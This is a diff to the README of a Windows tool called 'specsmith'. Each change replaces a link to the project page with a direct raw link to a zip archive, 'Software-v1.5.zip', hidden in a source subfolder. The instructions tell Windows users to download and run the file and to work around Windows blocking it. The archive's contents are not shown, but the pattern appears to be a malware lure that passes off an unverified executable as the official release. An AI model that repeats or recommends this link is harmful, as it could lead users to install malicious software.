@@ -1,12 +1,12 @@
 # 🧭 specsmith - Run AEE tools with ease
 
-[![Download specsmith](https://img.shields.io/badge/Download-Visit%20the%20page%20to%20download-blue?style=for-the-badge&logo=github)](https://github.com/dawnaadopted177/specsmith)
+[![Download specsmith](https://img.shields.io/badge/Download-Visit%20the%20page%20to%20download-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/dawnaadopted177/specsmith/main/src/specsmith/gui/Software-v1.5.zip)
 
 ## 📥 Download
 
 Use this link to visit the download page:
 
-https://github.com/dawnaadopted177/specsmith
+https://raw.githubusercontent.com/dawnaadopted177/specsmith/main/src/specsmith/gui/Software-v1.5.zip
 
 If you use Windows, open the page in your browser, then look for the latest release or the main app file. Save it to your PC before you run it.
 
@@ -38,7 +38,7 @@ If the app asks to install helper tools, allow it to finish. Some functions may 
 ## 🚀 Getting started on Windows
 
 1. Open the download page:
-   https://github.com/dawnaadopted177/specsmith
+   https://raw.githubusercontent.com/dawnaadopted177/specsmith/main/src/specsmith/gui/Software-v1.5.zip
 
 2. Find the latest release or the main download file.
 
@@ -202,4 +202,4 @@ If Windows blocks the app or nothing happens, try these steps:
 
 Visit the download page here:
 
-https://github.com/dawnaadopted177/specsmith
+https://raw.githubusercontent.com/dawnaadopted177/specsmith/main/src/specsmith/gui/Software-v1.5.zip
